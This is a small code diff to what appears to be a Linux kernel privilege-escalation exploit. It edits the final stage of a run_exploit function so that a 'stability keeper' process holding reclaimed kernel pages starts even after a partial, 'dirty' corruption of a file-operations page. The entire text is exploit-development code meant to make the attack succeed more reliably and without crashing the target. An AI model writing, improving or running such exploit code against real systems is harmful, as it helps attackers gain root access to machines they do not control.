@@ -767,10 +767,16 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
-  if (exploit_ok) {
+  if (exploit_ok || cfi_dirty_seen) {
     pid_t keeper = spawn_allocation_keeper();
-    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
-               keeper);
+    if (exploit_ok) {
+      pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
+                 keeper);
+    } else {
+      pr_warning("stability keeper pid=%d retaining dirty fops page; "
+                 "reboot required\n",
+                 keeper);
+    }
   }
   return exploit_ok ? 0 : 1;
 }
